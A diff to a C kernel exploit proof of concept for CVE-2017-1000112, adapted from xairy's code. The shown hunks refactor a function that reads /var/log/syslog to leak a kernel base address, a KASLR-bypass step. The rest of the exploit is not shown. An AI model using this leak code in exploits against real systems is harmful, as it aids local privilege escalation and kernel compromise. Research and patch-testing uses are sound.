@@ -15,6 +15,8 @@
 //
 // Mostly taken from original code by xairy:
 // https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-1000112/poc.c
+// ---
+// <bcoles@gmail.com>
 
 #define _GNU_SOURCE
 #include <fcntl.h>
@@ -28,8 +30,12 @@
 
 unsigned long get_kernel_addr_free_reserved_area_syslog() {
   FILE *f;
-  char *path = "/var/log/syslog";
-  const int addr_len = sizeof(long*) * 2;
+  char *endptr;
+  char *substr;
+  char *addr_buf;
+  char *line_buf;
+  const char *path = "/var/log/syslog";
+  const char *needle = "Freeing unused kernel memory";
   unsigned long addr = 0;
   char buff[BUFSIZ];
 
@@ -42,23 +48,20 @@ unsigned long get_kernel_addr_free_reserved_area_syslog() {
   }
 
   while ((fgets(buff, BUFSIZ, f)) != NULL) {
-    const char *needle1 = "Freeing unused kernel memory";
-    char *substr =
-        (char *)memmem(&buff[0], BUFSIZ, needle1, strlen(needle1));
+    substr = (char *)memmem(&buff[0], BUFSIZ, needle, strlen(needle));
 
     if (substr == NULL)
       continue;
 
-    char *line_buf = strtok(substr, "\n");
+    line_buf = strtok(substr, "\n");
     if (line_buf == NULL)
       return 0;
 
-    char *addr_buf = strstr(line_buf, "(");
+    addr_buf = strstr(line_buf, "(");
     if (addr_buf == NULL)
       return 0;
 
-    char *endptr = &addr_buf[addr_len];
-    addr = strtoul(&addr_buf[1], &endptr, 16);
+    addr = strtoull(&addr_buf[1], &endptr, 16);
 
     if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX)
       break;
